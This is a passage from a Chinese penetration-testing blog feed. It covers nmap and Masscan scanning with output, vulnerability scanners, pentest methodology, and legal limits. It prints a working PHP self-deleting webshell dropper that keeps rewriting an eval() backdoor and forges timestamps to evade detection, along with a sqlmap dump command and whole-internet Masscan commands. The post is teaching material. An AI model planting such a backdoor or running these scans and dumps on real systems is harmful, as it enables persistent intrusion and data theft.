class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"># 版本探测</span><br><span class="line">➜  ~ nmap 10.20.24.244 -sV</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 21:12 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">5900/tcp open  vnc     Apple remote desktop vnc</span><br><span class="line">Service Info: OS: Mac OS X; CPE: cpe:/o:apple:mac_os_x</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds</span><br><span class="line"></span><br><span class="line">  ~ nmap 10.20.24.244 -A</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 21:13 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">5900/tcp open  vnc     Apple remote desktop vnc</span><br><span class="line">|_ssl-cert: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ssl-date: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_tls-alpn: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_vnc-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">Service Info: OS: Mac OS X; CPE: cpe:/o:apple:mac_os_x</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds</span><br><span class="line"></span><br><span class="line"># 操作系统探测</span><br><span class="line">➜  ~ sudo nmap 10.211.55.17 -O</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 21:25 CST</span><br><span class="line">Nmap scan report for windows-7-1.shared (10.211.55.17)</span><br><span class="line">Host is up (0.00015s latency).</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">49152/tcp open  unknown</span><br><span class="line">49153/tcp open  unknown</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line">49155/tcp open  unknown</span><br><span class="line">49156/tcp open  unknown</span><br><span class="line">49158/tcp open  unknown</span><br><span class="line">MAC Address: 00:1C:42:86:1B:DE (Parallels)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows 7|2008|8.1</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1</span><br><span class="line">OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.54 seconds</span><br></pre></td></tr></table></figure><h3 id="保存输出"><a href="#保存输出" class="headerlink" title="保存输出"></a>保存输出</h3><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-oN</td><td>标准保存</td></tr><tr><td>-oX</td><td>XML 保存</td></tr></tbody></table><p><img src="http://qiniuyun.lintstar.top/20200802104146.png" alt="20200802104146"></p><p><code>快速找到.xml文件中的ip: VSCode ctrl + f 用最右面正则表达式搜索</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;</span><br></pre></td></tr></table></figure><p>Ctrl + Shift + L 选择所有出现在当前选中的行</p><p>VSCode 批量处理ip格式问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">开头标记：^  换成 http://</span><br><span class="line">结尾标记：$  换成 :8080</span><br><span class="line">全选后再替换</span><br></pre></td></tr></table></figure><h3 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h3><p>项目地址：<a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="noopener">https://github.com/robertdavidgraham/masscan</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 扫描整个互联网</span><br><span class="line">masscan 0.0.0.0/0 -p0-65535</span><br><span class="line"></span><br><span class="line"># 输出到文件中</span><br><span class="line">masscan 0.0.0.0/0 -p0-65535 -oX scan.xml</span><br><span class="line"></span><br><span class="line"># 默认的速率100包/秒，如果是扫描全网的话，需要提高速度。</span><br><span class="line">masscan 0.0.0.0/0 -p0-65535 --rate 100000 -oX scan.xml</span><br></pre></td></tr></table></figure><p>实用正则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 正则</span><br><span class="line">((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;</span><br><span class="line"></span><br><span class="line"># 换行</span><br><span class="line">^\s*(?=\r?$)\n</span><br></pre></td></tr></table></figure><h2 id="漏洞扫描工具"><a href="#漏洞扫描工具" class="headerlink" title="漏洞扫描工具"></a>漏洞扫描工具</h2><p>市面上也有很多各种各样的开源、商业扫描器。单就应用这一层来说，漏洞扫描器一般分为主动扫描和被动扫描两种。</p><ul><li><p>主动扫描<br>主动扫描一般用于黑盒测试，其形式为提供一个URL入口地址，然后由扫描器中的爬虫模块爬取所有链接，对GET、POST等请求进行参数变形和污染，进行重放测试，然后依据返回信息中的状态码、数据大小、数据内容关键字等去判断该请求是否含有相应的漏洞。例如：AWVS、Nessus、唐朝扫描器、BugScan、Pocsuite</p></li><li><p>被动扫描<br>被动扫描，与主动扫描相比，被动扫描并不进行大规模的爬虫爬取行为，而是直接通过捕获测试人员的测试请求，直接进行参数变形和污染来测试服务端的漏洞，如果通过响应信息能够判断出漏洞存在，则进行记录管理，有人工再去进行漏洞的复现和确认。例如：BurpSuite、Xray</p></li></ul><p>主动扫描与被动扫描最主要的区别为被动式扫描器不主动获取站点链接，而是通过流量、获取测试人员的访问请求等手段去采集数据源，然后进行类似的安全检测。</p><p><strong>主动扫描的 Web 扫描器的一些不足：</strong></p><p>由于数据源来自爬虫爬取，独立的页面、API接口等就无法覆盖，存在检测遗漏情况。</p><p>果是扫描单独的几个站点，主动扫描是够用的。但是在站点数量急剧增大的时候，主动扫描的效率、精准、速度都无法与被动扫描相比。</p><h2 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h2><p><img src="http://qiniuyun.lintstar.top/20200802112732.png" alt="20200802112732"></p><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。AWVS可以检查SQL注入漏洞，也可以检查跨站脚本攻击漏洞，可以扫描任何可以通过web浏览访问和遵循HTTP/HTTPS规则的 Web 站点和 Web应用程序。</p><p><strong>黑科技：</strong></p><p><img src="http://qiniuyun.lintstar.top/20200802113100.png" alt="20200802113100"></p><p>扫描过程：</p><p><img src="http://qiniuyun.lintstar.top/20200802114217.png" alt="20200802114217"></p><h2 id="Nessus-主机漏洞扫描"><a href="#Nessus-主机漏洞扫描" class="headerlink" title="Nessus 主机漏洞扫描"></a>Nessus 主机漏洞扫描</h2><p><img src="http://qiniuyun.lintstar.top/image-20200727154132756.png" alt="image-20200727154132756"></p><p>Nessus 在全世界有超过 75000 个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus 不同于传统的漏洞扫描软件，支持分布式扫描。</p><p>Linux下 Nessus 常用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">systemctl status nessusd # 查看运行状态</span><br><span class="line">systemctl start nessusd  # 启动 nessus</span><br><span class="line">systemctl stop nessusd   # 停止 nessus</span><br><span class="line">systemctl restart nessusd# 重启 nessus</span><br><span class="line">systemctl enable nessusd # 开机自启</span><br><span class="line">systemctl disable nessusd# 关闭开机自启</span><br><span class="line">systemctl kill nessusd   # 杀死 nessus 的子进程</span><br></pre></td></tr></table></figure><h3 id="基本网络扫描"><a href="#基本网络扫描" class="headerlink" title="基本网络扫描"></a>基本网络扫描</h3><p>多用于进行主机扫描测试，可以扫描系统层面的漏洞：</p><p><img src="http://qiniuyun.lintstar.top/image-20200727155401167.png" alt="image-20200727155401167"></p><h3 id="Web-应用测试"><a href="#Web-应用测试" class="headerlink" title="Web 应用测试"></a>Web 应用测试</h3><p>也可以类型 AWVS 那样对 Web 应用进行测试：</p><p><img src="http://qiniuyun.lintstar.top/image-20200727202443406.png" alt="image-20200727202443406"></p><h2 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h2><p><img src="http://qiniuyun.lintstar.top/1586916483667.png" alt="1586916483667"></p><p><strong>项目地址:<a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">https://github.com/chaitin/xray</a></strong></p><p>长亭科技研发的一款完善的安全评估工具，支持常见Web安全问题扫描和自定义POC，虽然Github有项目，但是不开源，只提供社区版本供大家使用。</p><p>转载：<a href="https://www.sqlsec.com/2020/04/xray.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/04/xray.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;信息收集技术&quot;&gt;&lt;a href=&quot;#信息收集技术&quot; class=&quot;headerlink&quot; title=&quot;信息收集技术&quot;&gt;&lt;/a&gt;信息收集技术&lt;/h1&gt;&lt;p&gt;在渗透测试过程中，第一步就是进行信息收集，信息收集的过程，很多人将其写成了工具、脚本，于是我们就有了很多指纹
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://winthorlimo.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="https://winthorlimo.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试基础</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined01/35d3b1d4.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined01/35d3b1d4.html</id>
    <published>2020-08-01T14:00:00.000Z</published>
    <updated>2020-08-20T09:26:53.273Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透测试基础"><a href="#渗透测试基础" class="headerlink" title="渗透测试基础"></a>渗透测试基础</h1><p>渗透测试（Penetration Testing）是指<strong>受信任的第三方</strong>通过<strong>模拟黑客</strong>的攻击技术与手段对<strong>目标网络、系统</strong>进行<strong>攻击测试</strong>，发现目标的<strong>安全隐患</strong>并给出<strong>安全加固建议</strong>的一种安全测试与评估方法。</p><h1 id="渗透测试的概念与流程"><a href="#渗透测试的概念与流程" class="headerlink" title="渗透测试的概念与流程"></a>渗透测试的概念与流程</h1><h2 id="受信任"><a href="#受信任" class="headerlink" title="受信任"></a>受信任</h2><p>16 年 11 月 7 日，《中华人民共和国网络安全法》颁布以来，一切非授权的渗透测试行为都是违法的。</p><h2 id="模拟黑客"><a href="#模拟黑客" class="headerlink" title="模拟黑客"></a>模拟黑客</h2><p>模拟黑客行为并不是真正的黑客行为，所以在渗透测试中涉及到高危操作的时候都需要上报并记录，高危行为如下：</p><h3 id="上传-webshell-尤其是不死马"><a href="#上传-webshell-尤其是不死马" class="headerlink" title="上传 webshell 尤其是不死马"></a>上传 webshell 尤其是不死马</h3><p><code>不死马.php</code> → <code>上传到server</code> → <code>server执行文件</code> → <code>server本地无限循环生成</code> (一句话.php)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行</span></span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除文件本身，以起到隐蔽自身的作用</span></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$file = <span class="string">'shell.php'</span>;</span><br><span class="line">$code = <span class="string">'&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72")&#123;@eval($_POST[a]);&#125; ?&gt;'</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以绕过“find –name '*.php' –mmin -10”命令检测最近10分钟修改或新创建的PHP文件</span></span><br><span class="line">    system(<span class="string">'touch -m -d "2018-12-01 09:10:12" shell.php'</span>);</span><br><span class="line">    usleep(<span class="number">5000</span>); <span class="comment">// 一微秒等于百万分之一秒</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为 shell.php 的文件，然后使用中国蚁剑输入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 如果允许，**重启**服务器是万能的。</span><br><span class="line">- 其次，最好的解决方案是 kill 掉www-data用户的所有子进程</span><br><span class="line"></span><br><span class="line">```linux</span><br><span class="line">ls -l</span><br><span class="line">ps aux | grep www-data</span><br><span class="line">ps aux | grep www-data| awk &apos;&#123;print $2&#125;&apos;</span><br><span class="line">ps aux | grep www-data| awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</span><br><span class="line">rm shell.php</span><br></pre></td></tr></table></figure></p><h3 id="脱裤点到为止"><a href="#脱裤点到为止" class="headerlink" title="脱裤点到为止"></a><strong>脱裤点到为止</strong></h3><blockquote><p>国安法规定脱库条目不得超过五条</p></blockquote><p>一般都使用 sqlmap 来进行脱裤，使用 –start –stop 来设置脱裤的起点和终点：</p><p>例：从1开始脱5条</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1:8888/Less-1/?id=1&quot; --dump -C&apos;id,username,password&apos; -T &apos;users&apos; -D &apos;security&apos; --start=1 --stop=5</span><br></pre></td></tr></table></figure><p>如果要证明某个表下面的数量的话，直接使用 sqlmap 的 –count 参数即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1:8888/Less-1/?id=1&quot; --count -T &apos;users&apos; -D &apos;security&apos;</span><br></pre></td></tr></table></figure><blockquote><p><strong>非授权不要随便去做</strong></p></blockquote><h2 id="发现隐患"><a href="#发现隐患" class="headerlink" title="发现隐患"></a>发现隐患</h2><p>渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对业务系统进行全面深入的安全测试，以此挖掘可能存在的安全缺陷和漏洞。</p><h2 id="服务器是如何被入侵的"><a href="#服务器是如何被入侵的" class="headerlink" title="服务器是如何被入侵的"></a>服务器是如何被入侵的</h2><p>在互联网中的一台服务器是如何被攻击者入侵的？攻击者要想先攻击服务器之前，必须先要保证他们之间能进行正常的通信。</p><p>那么此时客户端和服务端是怎么保证通信的呢？是端口。服务器上的各种服务，例如SSH、FTP、Web、数据库服务等等，它们会依托于端口来实现对外提供服务。</p><p><img src="http://qiniuyun.lintstar.top/image-20200721215047024.png" alt="image-20200721215047024"></p><p>所以我们攻击者所入侵的其实也是端口，当然我们不排除“<strong>物理攻击</strong>”。而对于服务器的入侵方式有很多，比如端口扫描、SSH口令爆破、FTP爆破、缓冲区溢出攻击等等去直接获取目标的权限。但是由于现在 Web 应用的飞速发展，现在的战场逐渐转移到了 Web 之上。</p><p><img src="http://qiniuyun.lintstar.top/image-20200721215425974.png" alt="image-20200721215425974"></p><p>所以正常的渗透测试流程是利用 Web 漏洞拿到 Web 权限，尝试 Getshell 拿到服务器普通用户的权限，提权拿到服务器的最高权限，服务器如果在内网的中的话，可以在内网中横向渗透在内网中拿到更多服务器的权限。</p><p>mi.com 只能扫描到8080 443 80 等Web端口</p><h2 id="近源渗透测试"><a href="#近源渗透测试" class="headerlink" title="近源渗透测试"></a>近源渗透测试</h2><p><strong>近源渗透测试和传统的渗透测试的主要区别在于对“边界”概念的理解上</strong>。在传统的网络测试中，各类防火墙、入侵检测等防护产品已经较为成熟，攻击者很难通过外网的网络入口突破企业的重重防御措施。<strong>而在近源渗透测试的场景中，由于攻击者位于目标企业附近甚至建筑内部，这些地方往往存在大量被企业忽视的安全盲点</strong>。结合近源渗透的相关测试方法与技巧，测试人员可以利用各类无线通信网络、物理接口和智能设备来突破安全防线进入企业内网，最终威胁到企业的关键系统及敏感业务的信息安全。</p><blockquote><p>小漫画：<a href="https://zhuanlan.zhihu.com/p/97865236" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/97865236</a></p></blockquote><h2 id="列举那些脆弱的-Web-应用"><a href="#列举那些脆弱的-Web-应用" class="headerlink" title="列举那些脆弱的 Web 应用"></a>列举那些脆弱的 Web 应用</h2><p><strong>CS即Client/Server(客户机/服务器)结构</strong> C/S结构在技术上很成熟</p><p><strong>BS即Browser/Server(浏览器/服务器)结构</strong>，就是只安装维护一个服务器(Server)，而客户端采用浏览器(Browse)运行软件。</p><p>目前 BS 越来越流行，Web 应用也越来越多，与我们的生活息息相关。下面来列举一些脆弱的 Web 应用：</p><p><strong>GOV 政府网站被挂博彩广告</strong></p><p><img src="http://qiniuyun.lintstar.top/image-20200722095245227.png" alt="image-20200722095245227"></p><p>以许某为骨干的菲律宾黑客团伙主要攻击入侵国内的新闻、学校、政府机关网站，通过寻找此类网站漏洞，植入木马病毒，控制网站服务器，加挂黑链自动链接博彩网站，或把境外博彩公司链接地址保存在搜索引擎内，当用户访问网站时，网站会自动跳转至境外博彩公司网页；用搜索引擎搜索“时时彩、博彩”等关键字时，就会优先显示境外博彩公司地址，以达到加大博彩公司访问量，吸引更多人参与赌博的目的。</p><p><strong>反共黑客的黑页</strong></p><p><img src="http://qiniuyun.lintstar.top/image-20200722095347400.png" alt="image-20200722095347400"></p><p>反共黑客是反对中国共产党的黑客组织，其手段是通过掌握中国境内大量网站漏洞，采用预先植入后门等手段，控制一些网站服务器，持续篡改中国境内政府和重要信息系统部门、企事业单位网站，并在篡改页面上发布反对中国共产党言论。不过亦有针对广播电视网络的攻击。到2013年为止，它至少入侵了600余个中国境内网站。</p><p><strong>网站暗链</strong></p><p><img src="http://qiniuyun.lintstar.top/20200808120720.png" alt="20200808120720"></p><p>正如其名，暗链就是指看不见的网站链接。由于暗链的嵌入做的十分隐蔽，短时间内很难被察觉，更不会自动跳转。这种连接类似于友情链接，对于单独页面可以有效提高其PR值。暗链分为两种情况，一种是主动隐藏别人网站的链接，另一种则是盗取自己的模板进而在上面保存很多自己的绝对地址。一般情况下，黑客通过设置使链接在页面不可见，但实际又存在，可以通过源码查看。通常方式有如设置css，使div等不可见或者使div的边距为负数，总之只要在页面上看不到就行，其位置一般处在源码的底部或者顶部。</p><h2 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h2><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>  渗透测试人员在事前<code>完全不了解任何目标内部信息</code>，例如网络拓扑、应用、系统等信息，对目标系统进行渗透测试。黑盒测试所使用的时间相对较⻓，并且对于渗透人员的技术能力要求相对高一些。</p><h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><p>  渗透测试人员在<code>事前已经获取目标内部信息</code>，例如网络拓扑、应用、系统、源代码等信息，对目标系统进行渗透测试。对比黑盒测试，白盒测试往往能用最小的代价，发现目标更多的安全隐患。具体漏洞细节又包括：Google Hack、目录扫描、Web漏洞扫描、暴力破解、信息泄露、任意文件上传、SQL 注入漏洞、XSS漏洞、CSRF 漏洞、SSRF 漏洞、任意文件下载读取删除漏洞、越权漏洞、业务逻辑漏洞、XXE漏洞、Xpath注入漏洞、反序列化漏洞、Web框架漏洞、弱口令、命令执行漏洞、拒绝服务攻击漏洞等</p><h2 id="PTES-渗透测试"><a href="#PTES-渗透测试" class="headerlink" title="PTES 渗透测试"></a>PTES 渗透测试</h2><p><img src="http://qiniuyun.lintstar.top/image-20200722102631933.png" alt="image-20200722102631933"></p><h3 id="前期交互"><a href="#前期交互" class="headerlink" title="前期交互"></a>前期交互</h3><p>在进行渗透测试之前，渗透测试团队需要与客户组织交互讨论，确定渗透测试目标、渗透测试范围、渗透测试限制条件、服务合同等细节进行商议，达成一致协议。</p><p>需要收集客户需求，根据商定的目标、范围、限制条件，项目管理与规划等信息来确定渗透测试方案。</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="http://qiniuyun.lintstar.top/image-20200722104131614.png" alt="image-20200722104131614"></p><p>根据确定的渗透测试目标以及范围，使用各种手段尽可能的收集与测试目标相关的信息。例如开源情报(OSINT)、Google Hacking、扫描探测等。收集到的信息越充分对之后的渗透测试越有利。</p><ul><li>系统信息</li><li><p>业务信息</p><p>根据确定的渗透测试目标以及范围，使用各种手段尽可能的收集与测试目标相关的信息。例如开源情报(OSINT)、Google Hacking、扫描探测等。收集到的信息越充分对之后的渗透测试越有利</p></li></ul><blockquote><p><strong><code>渗透测试的本质就是信息收集</code></strong></p></blockquote><h3 id="威胁建模"><a href="#威胁建模" class="headerlink" title="威胁建模"></a>威胁建模</h3><ul><li>攻击规划</li><li>攻击渗透<br>渗透测试团队需要对收集到的信息进行分析并且做出攻击的规划，确定出最有效、最可行的攻击方案。</li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ul><li>应用漏洞</li><li>业务漏洞<br>根据攻击方案，需要挖掘可利用的漏洞来获取目标系统的访问控制权限。通过分析信息收集到的数据，比如系统信息、漏洞扫描结果等，进行验证并发现漏洞。挖掘目标系统中可利用的潜在漏洞，并开发EXP脚本。渗透攻击利用发现的安全漏洞或编写好的漏洞利用程序（Exploit）来入侵目标系统，获得访问控制权。</li></ul><h3 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h3><ul><li>入侵攻击</li><li>获取权限<br>过程中可能会因为Exp的兼容性，需要对其进行修改或额外研究。还需要考虑对目标系统的安全机制进行逃逸，避免被发现。</li></ul><h3 id="后渗透攻击"><a href="#后渗透攻击" class="headerlink" title="后渗透攻击"></a>后渗透攻击</h3><ul><li>内网渗透</li><li><p>资料整理</p><p>需要渗透测试团队根据目标组织的业务经营模式、资产保护模式和安全防御规划的不同特点，资助设计出攻击目标，识别关键基础设施，并寻找客户组织组织最具价值和尝试安全保护的信息和资产，最终达到能够对客户组织造成最重要业务影响的攻击途径。</p></li></ul><h3 id="渗透报告"><a href="#渗透报告" class="headerlink" title="渗透报告"></a>渗透报告</h3><p>渗透测试报告中会涵盖之前所有阶段所收集的关键情报信息、挖掘出的安全漏洞、成功渗透攻击的过程、造成业务影响后果的攻击途径。从防御⻆度考虑的安全防御体系存在的薄弱点、⻛险以及修复建议。</p><p><img src="http://qiniuyun.lintstar.top/image-20200722105335774.png" alt="image-20200722105335774"></p><h2 id="专业术语"><a href="#专业术语" class="headerlink" title="专业术语"></a>专业术语</h2><ul><li><code>POC</code>（Proof of Concept）：概念验证，用于验证安全漏洞是否存在，能否被利用。</li><li><code>EXP</code>（Exploit）：漏洞利用程序，利用安全漏洞造成入侵或破坏效果的程序。</li><li><code>Payload</code>，有效荷载、攻击载荷，目标系统被渗透攻击之后所执行的代码。</li></ul><p>安全漏洞是存在生命周期的，简单的可以分为几个阶段：</p><ol><li>漏洞被发现</li><li>漏洞/Exploit信息披露公布</li><li>漏洞具有官方补丁或修复方案</li></ol><p>同时也繁生出几个概念，分为是：</p><ul><li><code>0day</code>，漏洞信息未公布时，这时利用 EXP 可以通杀。</li><li><code>1day</code>，漏洞信息被公布，但漏洞没有官方补丁或者修复方案，这时利用 EXP 可以入侵大部分系统。</li><li><code>Nday</code>，漏洞已有官方补丁或者修复方案，这时利用 EXP 只能入侵还未及时修复的系统。</li></ul><h1 id="Web服务端概述"><a href="#Web服务端概述" class="headerlink" title="Web服务端概述"></a>Web服务端概述</h1><p>在 Web 的世界中，分为客户端与服务端。客户端就是我们常用的浏览器，服务端是提供 Web 服务的服务器。</p><p><img src="http://qiniuyun.lintstar.top/image-20200722112058166.png" alt="image-20200722112058166"></p><h2 id="静态网页与动态网页的区别"><a href="#静态网页与动态网页的区别" class="headerlink" title="静态网页与动态网页的区别"></a>静态网页与动态网页的区别</h2><ul><li>web服务器<br>IIS,apache,tomcat,nginx (负载均衡好，抗压能力强)</li><li>静态网页<br>静态网⻚是以.htm、.html为后缀的文件</li><li>动态网页<br>动态网⻚一般是以 .php、.jsp、.asp、.aspx 为后缀的文件</li></ul><h3 id="访问静态网⻚流程"><a href="#访问静态网⻚流程" class="headerlink" title="访问静态网⻚流程"></a>访问静态网⻚流程</h3><p><img src="http://qiniuyun.lintstar.top/image-20200722132909869.png" alt="image-20200722132909869"></p><p>服务端中真正接收处理报文的是 Web 应用服务器（Web容器、中间件）。常⻅的Web 应用服务器有 Apache、IIS、Tomcat、Nginx等等。Web应用服务器是专⻔用于提供HTTP服务，它会处理接收到的HTTP请求，最后构建HTTP报文进行响应。</p><p>从宏观的层面来简单的理解 Web 应用服务器处理 HTTP 报文的过程，以Apache为例：</p><p><img src="http://qiniuyun.lintstar.top/image-20200722133007442.png" alt="image-20200722133007442"></p><h3 id="访问动态网⻚流程"><a href="#访问动态网⻚流程" class="headerlink" title="访问动态网⻚流程"></a>访问动态网⻚流程</h3><p>访问的动态网⻚一般是以 .php、.jsp、.asp、.aspx 为后缀的文件。这些文件的内容一般是由 HTML+CSS+JavaScript+后端语言代码构成。例如 .php 的后缀的文件，文件内容中就会带有PHP代码。</p><p>动态网⻚的大致请求过程如下：</p><h2 id="Web服务架构"><a href="#Web服务架构" class="headerlink" title="Web服务架构"></a>Web服务架构</h2><ul><li>LNMP：Linux、Nginx、MySQL、PHP</li><li>LAMP：Linux、Apache、MySQL、PHP</li><li><p>常⻅的 Web 服务架构：</p><p>| 操作系统      | Web应用服务器 | 动态脚本引擎 | 数据库服务 | 数据库端口 |<br>| ————- | ————- | ———— | ———- | ———- |<br>| Windows       | IIS           | ASP(.NET)    | SQLServer  | 1433       |<br>| Windows/Linux | Apache/Nginx  | PHP          | MySQL      | 3306       |<br>| Windows/Linux | Tomcat        | 